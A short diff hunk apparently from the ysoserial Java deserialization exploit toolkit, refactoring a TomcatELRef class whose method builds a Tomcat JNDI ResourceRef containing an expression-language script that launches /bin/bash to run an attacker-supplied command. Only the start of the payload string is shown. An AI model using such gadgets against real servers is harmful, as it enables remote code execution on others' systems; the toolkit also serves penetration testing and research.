@@ -3,9 +3,9 @@ package ysoserial.bullet.jndi;
 import org.apache.naming.ResourceRef;
 import javax.naming.StringRefAddr;
 
-public class TomcatELRef implements TomcatRef {
+public class TomcatELRef implements ReferencePayload {
     @Override
-    public ResourceRef getObject(String command) throws Exception {
+    public ResourceRef getReference(String command) throws Exception {
         String jsRuntimeCMD = "var strs=new Array(3);\n" +
             "if(java.io.File.separator.equals('/')){\n" +
             "   strs[0]='/bin/bash';\n" +
